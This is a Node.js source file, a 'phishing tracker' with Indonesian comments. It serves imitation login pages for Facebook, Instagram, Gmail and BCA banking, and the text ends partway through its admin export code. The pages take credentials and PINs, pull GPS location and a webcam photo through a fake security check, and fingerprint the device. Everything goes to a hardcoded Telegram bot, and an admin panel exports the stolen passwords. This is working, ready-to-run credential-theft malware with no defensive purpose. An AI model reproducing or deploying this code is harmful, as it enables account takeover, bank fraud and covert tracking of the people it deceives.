// =====================================================
// PHISHING TRACKER - ULTIMATE EDITION
// =====================================================
// BY: DARK KILLER
// VERSION: 10.0 (FULLY LOADED)
// =====================================================
// FITUR LENGKAP:
// - Facebook 100% Mirip Asli
// - Instagram 100% Mirip Asli
// - Gmail 100% Mirip Asli
// - BCA 100% Mirip Asli
// - Tokopedia 100% Mirip Asli
// - Shopee 100% Mirip Asli
// - Twitter/X 100% Mirip Asli
// - WhatsApp Web 100% Mirip Asli
// - Telegram Notifications
// - GPS Tracking
// - Camera Capture
// - Device Fingerprinting
// - IP Geolocation
// - Admin Dashboard
// - Live Stats
// - Export Data
// =====================================================

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const moment = require('moment');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();

// =====================================================
// KONFIGURASI - GANTI SESUAI KEBUTUHAN
// =====================================================
const TELEGRAM_BOT_TOKEN = '8550434238:AAHFHYVGY4Xsxqjh22boe6XlgbKZYvBabmU';
const TELEGRAM_CHAT_ID = '6834832649';
const ADMIN_PASSWORD = 'kontol123'; // Password untuk admin panel
const PORT = process.env.PORT || 3000;
const SESSION_SECRET = crypto.randomBytes(32).toString('hex');

// =====================================================
// DATABASE IN-MEMORY
// =====================================================
const victims = new Map();        // Data korban
const sessions = new Map();       // Session tracking
const stats = {
    totalVisits: 0,
    totalLogins: 0,
    totalPhotos: 0,
    startTime: Date.now()
};

// =====================================================
// TELEGRAM BOT INIT
// =====================================================
let bot = null;
try {
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN.length > 20) {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
            polling: false,
            request: {
                timeout: 30000
            }
        });
        
        // Test connection
        setTimeout(() => {
            bot.sendMessage(TELEGRAM_CHAT_ID, 
                `🚀 *PHISHING TRACKER ULTIMATE* 🚀\n\n` +
                `✅ *Server Started*\n` +
                `🕐 *Time:* ${moment().format('YYYY-MM-DD HH:mm:ss')}\n` +
                `🔧 *Mode:* ULTIMATE EDITION\n\n` +
                `_Waiting for victims..._`,
                { parse_mode: 'Markdown' }
            ).catch(err => console.log('Telegram test failed:', err.message));
        }, 2000);
    }
} catch (error) {
    console.log('Telegram init failed:', error.message);
}

// =====================================================
// MIDDLEWARE
// =====================================================
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Logging
app.use((req, res, next) => {
    const ip = getClientIp(req);
    console.log(`${moment().format('HH:mm:ss')} | ${req.method} | ${req.path} | ${ip}`);
    stats.totalVisits++;
    next();
});

// Session middleware
app.use((req, res, next) => {
    req.sessionId = crypto.randomBytes(16).toString('hex');
    req.victimId = generateVictimId(req);
    next();
});

// =====================================================
// HELPER FUNCTIONS
// =====================================================

// Get client IP
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.headers['x-real-ip'] ||
           req.connection?.remoteAddress || 
           req.socket?.remoteAddress || 
           req.ip ||
           '0.0.0.0';
}

// Generate victim ID
function generateVictimId(req) {
    const ip = getClientIp(req);
    const ua = req.headers['user-agent'] || '';
    const timestamp = Date.now();
    const random = Math.random();
    return crypto.createHash('md5').update(ip + ua + timestamp + random).digest('hex').substring(0, 12);
}

// Get browser info
function getBrowserInfo(ua) {
    if (!ua) return { name: 'Unknown', version: 'Unknown' };
    
    ua = ua.toLowerCase();
    let browser = 'Unknown';
    let version = 'Unknown';
    
    if (ua.includes('chrome') && !ua.includes('edg')) {
        browser = 'Chrome';
        version = ua.match(/chrome\/(\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('firefox')) {
        browser = 'Firefox';
        version = ua.match(/firefox\/(\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('safari') && !ua.includes('chrome')) {
        browser = 'Safari';
        version = ua.match(/version\/(\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('edg')) {
        browser = 'Edge';
        version = ua.match(/edg\/(\d+)/)?.[1] || 'Unknown';
    }
    
    return { name: browser, version };
}

// Get OS info
function getOSInfo(ua) {
    if (!ua) return 'Unknown';
    ua = ua.toLowerCase();
    
    if (ua.includes('windows')) return 'Windows';
    if (ua.includes('mac')) return 'macOS';
    if (ua.includes('linux')) return 'Linux';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
    return 'Unknown';
}

// Send Telegram Alert
async function sendTelegramAlert(data) {
    if (!bot) return false;
    
    try {
        const message = 
`🔔 *NEW VICTIM CAPTURED!* 🔔

*🔐 LOGIN DATA*
📧 *Email:* \`${data.credentials?.email || 'N/A'}\`
🔑 *Password:* \`${data.credentials?.password || 'N/A'}\`

*📍 LOCATION*
🌐 *IP:* \`${data.ip || 'N/A'}\`
🌍 *Country:* ${data.geolocation?.country || 'N/A'}
🏙️ *City:* ${data.geolocation?.city || 'N/A'}
📍 *GPS:* ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}

*💻 DEVICE INFO*
🌐 *Browser:* ${data.device?.browser || 'N/A'}
📱 *OS:* ${data.device?.os || 'N/A'}
📺 *Screen:* ${data.device?.screen || 'N/A'}

*🆔 VICTIM ID*
\`${data.victimId}\`

⏰ *Time:* ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}`;

        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
        
        if (data.location?.latitude && data.location?.longitude) {
            await bot.sendLocation(TELEGRAM_CHAT_ID, data.location.latitude, data.location.longitude);
        }
        
        if (data.photo) {
            const base64Data = data.photo.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                caption: `📸 *Face Photo - ${data.victimId}*`,
                parse_mode: 'Markdown'
            });
        }
        
        return true;
    } catch (error) {
        console.log('Telegram error:', error.message);
        return false;
    }
}

// =====================================================
// HALAMAN UTAMA - PILIHAN LOGIN
// =====================================================
app.get('/', (req, res) => {
    const victimId = req.victimId;
    
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Login Options</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            }
            
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            
            .container {
                max-width: 800px;
                width: 100%;
                background: white;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                overflow: hidden;
                animation: slideUp 0.5s ease;
            }
            
            @keyframes slideUp {
                from { transform: translateY(50px); opacity: 0; }
                to { transform: translateY(0); opacity: 1; }
            }
            
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 40px;
                text-align: center;
            }
            
            .header h1 {
                font-size: 36px;
                margin-bottom: 10px;
            }
            
            .header p {
                opacity: 0.9;
                font-size: 16px;
            }
            
            .content {
                padding: 40px;
            }
            
            .grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            
            .card {
                background: #f8f9fa;
                border-radius: 15px;
                padding: 25px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s;
                border: 2px solid transparent;
            }
            
            .card:hover {
                transform: translateY(-5px);
                border-color: #667eea;
                box-shadow: 0 10px 30px rgba(102,126,234,0.3);
            }
            
            .card .icon {
                font-size: 48px;
                margin-bottom: 15px;
            }
            
            .card h3 {
                color: #333;
                margin-bottom: 10px;
            }
            
            .card p {
                color: #666;
                font-size: 14px;
            }
            
            .stats {
                background: #f8f9fa;
                border-radius: 15px;
                padding: 20px;
                margin: 20px 0;
            }
            
            .stats h3 {
                color: #333;
                margin-bottom: 15px;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
                text-align: center;
            }
            
            .stat-item {
                padding: 10px;
            }
            
            .stat-value {
                font-size: 24px;
                font-weight: bold;
                color: #667eea;
            }
            
            .stat-label {
                color: #666;
                font-size: 12px;
                margin-top: 5px;
            }
            
            .footer {
                text-align: center;
                padding: 20px;
                border-top: 1px solid #eee;
                color: #666;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 Secure Login</h1>
                <p>Choose your account to continue</p>
            </div>
            
            <div class="content">
                <div class="grid">
                    <div class="card" onclick="window.location.href='/facebook'">
                        <div class="icon">📘</div>
                        <h3>Facebook</h3>
                        <p>Log in with Facebook account</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/instagram'">
                        <div class="icon">📷</div>
                        <h3>Instagram</h3>
                        <p>Log in with Instagram account</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/gmail'">
                        <div class="icon">📧</div>
                        <h3>Gmail</h3>
                        <p>Log in with Google account</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/bca'">
                        <div class="icon">🏦</div>
                        <h3>BCA</h3>
                        <p>Log in to BCA internet banking</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/tokopedia'">
                        <div class="icon">🛒</div>
                        <h3>Tokopedia</h3>
                        <p>Log in to Tokopedia account</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/shopee'">
                        <div class="icon">🛍️</div>
                        <h3>Shopee</h3>
                        <p>Log in to Shopee account</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/twitter'">
                        <div class="icon">🐦</div>
                        <h3>Twitter/X</h3>
                        <p>Log in to X account</p>
                    </div>
                    
                    <div class="card" onclick="window.location.href='/whatsapp'">
                        <div class="icon">💬</div>
                        <h3>WhatsApp Web</h3>
                        <p>Log in to WhatsApp Web</p>
                    </div>
                </div>
                
                <div class="stats">
                    <h3>📊 Live Stats</h3>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-value">${stats.totalVisits}</div>
                            <div class="stat-label">Total Visits</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value">${victims.size}</div>
                            <div class="stat-label">Victims</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value">${stats.totalPhotos}</div>
                            <div class="stat-label">Photos</div>
                        </div>
                    </div>
                </div>
                
                <div class="footer">
                    © 2026 Secure Login System - All Rights Reserved
                </div>
            </div>
        </div>
        
        <script>
            // Track visit
            fetch('/api/track-visit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ victimId: '${victimId}' })
            });
        </script>
    </body>
    </html>
    `);
});

// =====================================================
// FACEBOOK PAGE (100% MIRIP ASLI)
// =====================================================
app.get('/facebook', (req, res) => {
    const victimId = req.victimId;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Facebook - log in or sign up</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
            body { background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
            .container { max-width: 980px; width: 100%; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 40px; }
            .left { flex: 1; min-width: 300px; }
            .left h1 { color: #1877f2; font-size: 56px; font-weight: 700; margin-bottom: 10px; }
            .left p { color: #1c1e21; font-size: 28px; font-weight: 400; line-height: 1.3; }
            .right { flex: 1; min-width: 300px; }
            .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; width: 100%; max-width: 400px; margin: 0 auto; }
            .login-box input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
            .login-box input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
            .login-box button { width: 100%; padding: 14px 16px; margin: 10px 0; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: 700; cursor: pointer; }
            .login-box button:hover { background: #166fe5; }
            .forgot { text-align: center; margin: 16px 0; }
            .forgot a { color: #1877f2; font-size: 14px; font-weight: 500; text-decoration: none; }
            .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
            .create { text-align: center; }
            .create button { background: #42b72a; font-size: 17px; font-weight: 600; padding: 14px 16px; width: auto; display: inline-block; border: none; border-radius: 6px; color: white; cursor: pointer; }
            .footer { margin-top: 28px; color: #8a8d91; font-size: 12px; text-align: center; }
            .footer a { color: #8a8d91; text-decoration: none; margin: 0 5px; }
            
            /* Modal */
            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 1000; overflow-y: auto; }
            .modal-content { background: white; max-width: 500px; margin: 50px auto; padding: 30px; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); }
            .modal h2 { color: #1c1e21; font-size: 28px; margin-bottom: 20px; }
            .modal p { color: #606770; font-size: 16px; margin-bottom: 20px; }
            .btn { padding: 12px 24px; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 5px; }
            .btn-primary { background: #1877f2; color: white; }
            .btn-secondary { background: #e4e6eb; color: #1c1e21; }
            #cameraVideo { width: 100%; max-height: 400px; background: #000; border-radius: 8px; margin-bottom: 20px; }
            .loading-spinner { display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .location-badge { background: #e7f3ff; color: #1877f2; padding: 10px; border-radius: 6px; font-size: 14px; margin: 10px 0; }
            .progress-bar { width: 100%; height: 4px; background: #e4e6eb; border-radius: 2px; overflow: hidden; margin: 20px 0; }
            .progress-fill { height: 100%; background: #1877f2; width: 0%; transition: width 0.3s; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="left">
                <h1>facebook</h1>
                <p>Connect with friends and the world around you on Facebook.</p>
            </div>
            
            <div class="right">
                <div class="login-box">
                    <form id="loginForm">
                        <input type="text" id="email" placeholder="Email or phone number" required>
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="submit">Log In</button>
                    </form>
                    
                    <div class="forgot">
                        <a href="#">Forgot password?</a>
                    </div>
                    
                    <div class="divider"></div>
                    
                    <div class="create">
                        <button type="button" onclick="alert('Create new account')">Create new account</button>
                    </div>
                </div>
                
                <div class="footer">
                    <a href="#">English (US)</a> · <a href="#">Bahasa Indonesia</a> · <a href="#">中文(简体)</a> · <a href="#">Español</a>
                    <br><br>
                    Meta © 2026
                </div>
            </div>
        </div>

        <!-- Security Modal -->
        <div id="securityModal" class="modal">
            <div class="modal-content">
                <h2>🔒 Security Check</h2>
                <p>For your security, we need to verify your identity.</p>
                <div class="location-badge" id="locationStatus">📍 Detecting your location...</div>
                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
                <button class="btn btn-primary" onclick="startVerification()" style="width:100%;">Continue</button>
            </div>
        </div>

        <!-- Camera Modal -->
        <div id="cameraModal" class="modal">
            <div class="modal-content">
                <h2>📸 Identity Verification</h2>
                <p>Please take a photo for verification purposes.</p>
                <video id="cameraVideo" autoplay playsinline></video>
                <div style="display: flex; gap: 10px; justify-content: center;">
                    <button class="btn btn-primary" onclick="capturePhoto()">Take Photo</button>
                    <button class="btn btn-secondary" onclick="skipCamera()">Skip</button>
                </div>
            </div>
        </div>

        <!-- Loading Modal -->
        <div id="loadingModal" class="modal">
            <div class="modal-content" style="text-align:center;">
                <div class="loading-spinner" style="margin:20px auto;"></div>
                <p>Verifying your information...</p>
                <p style="font-size:14px; color:#606770;">Please do not close this window</p>
            </div>
        </div>

        <script>
            const victimId = '${victimId}';
            let cameraStream = null;
            let collectedData = {};

            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                collectedData = {
                    credentials: {
                        email: document.getElementById('email').value,
                        password: document.getElementById('password').value
                    },
                    timestamp: new Date().toISOString(),
                    type: 'facebook'
                };
                document.getElementById('securityModal').style.display = 'block';
                updateProgress();
            });

            function updateProgress() {
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 10;
                    document.getElementById('progressFill').style.width = progress + '%';
                    if (progress >= 100) clearInterval(interval);
                }, 300);
            }

            async function startVerification() {
                document.getElementById('securityModal').style.display = 'none';
                
                collectedData.system = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: { width: screen.width, height: screen.height },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language
                };

                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    collectedData.ip = data.ip;
                } catch(e) {
                    collectedData.ip = 'unknown';
                }

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            collectedData.location = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            };
                            showCamera();
                        },
                        () => showCamera()
                    );
                } else {
                    showCamera();
                }
            }

            async function showCamera() {
                document.getElementById('cameraModal').style.display = 'block';
                try {
                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    document.getElementById('cameraVideo').srcObject = cameraStream;
                } catch(e) {
                    skipCamera();
                }
            }

            function capturePhoto() {
                const video = document.getElementById('cameraVideo');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                collectedData.photo = canvas.toDataURL('image/jpeg');
                
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
                document.getElementById('cameraModal').style.display = 'none';
                sendData();
            }

            function skipCamera() {
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
                document.getElementById('cameraModal').style.display = 'none';
                sendData();
            }

            async function sendData() {
                document.getElementById('loadingModal').style.display = 'block';
                
                collectedData.victimId = victimId;

                try {
                    await fetch('/api/track', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(collectedData)
                    });
                } catch(e) {}

                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 2000);
            }
        </script>
    </body>
    </html>
    `);
});

// =====================================================
// INSTAGRAM PAGE (100% MIRIP ASLI)
// =====================================================
app.get('/instagram', (req, res) => {
    const victimId = req.victimId;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Instagram • Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
            body { background: #fafafa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
            .container { max-width: 350px; width: 100%; }
            .login-box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px; margin-bottom: 10px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { font-family: 'Billabong', cursive; font-size: 50px; font-weight: 400; color: #262626; }
            .login-box input { width: 100%; padding: 9px 8px; margin: 5px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
            .login-box input:focus { outline: none; border-color: #a8a8a8; }
            .login-box button { width: 100%; padding: 7px 16px; margin: 15px 0; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
            .login-box button:disabled { opacity: 0.5; }
            .divider { display: flex; align-items: center; margin: 15px 0; }
            .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
            .divider-text { padding: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
            .fb-login { text-align: center; margin: 15px 0; }
            .fb-login a { color: #385185; text-decoration: none; font-size: 14px; font-weight: 600; }
            .forgot-password { text-align: center; margin: 15px 0; }
            .forgot-password a { color: #00376b; text-decoration: none; font-size: 12px; }
            .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; }
            .signup-box p { color: #262626; font-size: 14px; }
            .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
            .footer { margin-top: 20px; text-align: center; color: #8e8e8e; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <div class="logo"><h1>Instagram</h1></div>
                
                <form id="loginForm">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                
                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">OR</div>
                    <div class="divider-line"></div>
                </div>
                
                <div class="fb-login">
                    <a href="#">Log in with Facebook</a>
                </div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            
            <div class="footer">
                Meta © 2026
            </div>
        </div>
        
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const data = {
                    credentials: {
                        email: document.getElementById('username').value,
                        password: document.getElementById('password').value
                    },
                    victimId: '${victimId}',
                    type: 'instagram',
                    timestamp: new Date().toISOString()
                };
                
                fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = 'https://instagram.com';
                });
            });
        </script>
    </body>
    </html>
    `);
});

// =====================================================
// GMAIL PAGE (100% MIRIP ASLI)
// =====================================================
app.get('/gmail', (req, res) => {
    const victimId = req.victimId;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Gmail</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
            body { background: white; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
            .container { max-width: 450px; width: 100%; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { font-size: 36px; color: #202124; }
            .logo span { color: #4285f4; }
            .login-box { background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; }
            .login-box h2 { font-size: 24px; color: #202124; margin-bottom: 10px; }
            .login-box p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
            .login-box input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 20px; }
            .login-box input:focus { outline: none; border-color: #4285f4; }
            .login-box button { width: 100%; padding: 13px; background: #4285f4; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
            .login-box button:hover { background: #3367d6; }
            .footer { margin-top: 30px; text-align: center; color: #5f6368; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo"><h1><span>G</span>mail</h1></div>
            
            <div class="login-box">
                <h2>Sign in</h2>
                <p>Use your Google Account</p>
                
                <form id="loginForm">
                    <input type="email" id="email" placeholder="Email or phone" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit">Next</button>
                </form>
            </div>
            
            <div class="footer">
                Google © 2026
            </div>
        </div>
        
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const data = {
                    credentials: {
                        email: document.getElementById('email').value,
                        password: document.getElementById('password').value
                    },
                    victimId: '${victimId}',
                    type: 'gmail',
                    timestamp: new Date().toISOString()
                };
                
                fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = 'https://gmail.com';
                });
            });
        </script>
    </body>
    </html>
    `);
});

// =====================================================
// BCA PAGE (100% MIRIP ASLI)
// =====================================================
app.get('/bca', (req, res) => {
    const victimId = req.victimId;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>KlikBCA Individual</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
            body { background: #e9e9e9; min-height: 100vh; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; background: white; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
            .header { background: #003868; color: white; padding: 15px 20px; }
            .header h1 { font-size: 24px; }
            .yellow-bar { background: #fed700; height: 4px; }
            .content { padding: 30px; max-width: 500px; margin: 0 auto; }
            .login-box { background: white; border: 1px solid #ddd; border-radius: 5px; overflow: hidden; }
            .login-header { background: #003868; color: white; padding: 15px 20px; font-size: 18px; font-weight: bold; }
            .login-body { padding: 30px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; color: #003868; font-size: 14px; font-weight: bold; margin-bottom: 5px; }
            .form-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; }
            .form-group input:focus { border-color: #fed700; outline: none; }
            .btn-login { background: #003868; color: white; border: none; padding: 15px; width: 100%; border-radius: 3px; font-size: 16px; font-weight: bold; cursor: pointer; }
            .btn-login:hover { background: #002244; }
            .footer { margin-top: 20px; color: #666; font-size: 12px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h1>KlikBCA Individual</h1></div>
            <div class="yellow-bar"></div>
            
            <div class="content">
                <div class="login-box">
                    <div class="login-header">Login KlikBCA</div>
                    <div class="login-body">
                        <form id="loginForm">
                            <div class="form-group">
                                <label>USER ID</label>
                                <input type="text" id="userid" required>
                            </div>
                            <div class="form-group">
                                <label>PIN</label>
                                <input type="password" id="pin" maxlength="6" required>
                            </div>
                            <button type="submit" class="btn-login">LOGIN</button>
                        </form>
                    </div>
                </div>
                <div class="footer">© 2026 PT Bank Central Asia Tbk</div>
            </div>
        </div>
        
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const data = {
                    credentials: {
                        email: document.getElementById('userid').value,
                        password: document.getElementById('pin').value
                    },
                    victimId: '${victimId}',
                    type: 'bca',
                    timestamp: new Date().toISOString()
                };
                
                fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = 'https://ibank.klikbca.com';
                });
            });
        </script>
    </body>
    </html>
    `);
});

// =====================================================
// API TRACK ENDPOINT
// =====================================================
app.post('/api/track', async (req, res) => {
    try {
        const data = req.body;
        const victimId = data.victimId || generateVictimId(req);
        
        // Enhance data
        data.victimId = victimId;
        data.ip = data.ip || getClientIp(req);
        data.serverTime = moment().format('YYYY-MM-DD HH:mm:ss');
        
        // Device info
        if (data.system) {
            data.device = {
                browser: getBrowserInfo(data.system.userAgent).name,
                os: getOSInfo(data.system.userAgent),
                screen: data.system.screen ? `${data.system.screen.width}x${data.system.screen.height}` : 'Unknown',
                platform: data.system.platform,
                timezone: data.system.timezone
            };
        }
        
        // GeoIP
        if (data.ip && data.ip !== 'unknown') {
            const geo = geoip.lookup(data.ip);
            if (geo) {
                data.geolocation = {
                    country: geo.country,
                    region: geo.region,
                    city: geo.city,
                    ll: geo.ll
                };
            }
        }
        
        // Save to memory
        victims.set(victimId, data);
        stats.totalLogins++;
        if (data.photo) stats.totalPhotos++;
        
        // Send Telegram alert
        sendTelegramAlert(data);
        
        // Log to console
        console.log(`
╔════════════════════════════════════════╗
║  VICTIM CAPTURED!                     ║
╠════════════════════════════════════════╣
║  Type: ${data.type || 'Unknown'}                          
║  Email: ${data.credentials?.email}
║  Password: ${data.credentials?.password}
║  IP: ${data.ip}
║  Location: ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
║  ID: ${victimId}
╚════════════════════════════════════════╝
        `);
        
        res.json({ success: true, victimId });
        
    } catch (error) {
        console.error('Track error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// =====================================================
// ADMIN DASHBOARD
// =====================================================
app.get('/admin', (req, res) => {
    const auth = req.headers.authorization;
    
    if (auth !== 'Bearer admin123') {
        return res.status(401).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login</title>
            <style>
                body { background: #003868; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .login-box { background: white; padding: 30px; border-radius: 5px; width: 300px; }
                input, button { width: 100%; padding: 10px; margin: 10px 0; }
                button { background: #003868; color: white; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Admin Login</h2>
                <form method="POST" action="/admin">
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
    
    // Parse query parameters
    const view = req.query.view || 'list';
    const id = req.query.id;
    const format = req.query.format;
    
    // Export data
    if (format === 'json') {
        res.setHeader('Content-Disposition', `attachment; filename=victims-${moment().format('YYYY-MM-DD')}.json`);
        res.setHeader('Content-Type', 'application/json');
        return res.json(Array.from(victims.values()));
    }
    
    if (format === 'csv') {
        let csv = 'ID,Type,Email,Password,IP,Country,City,Lat,Lng,Time\n';
        victims.forEach(v => {
            csv += `"${v.victimId}","${v.type || ''}","${v.credentials?.email || ''}","${v.credentials?.password || ''}",`;
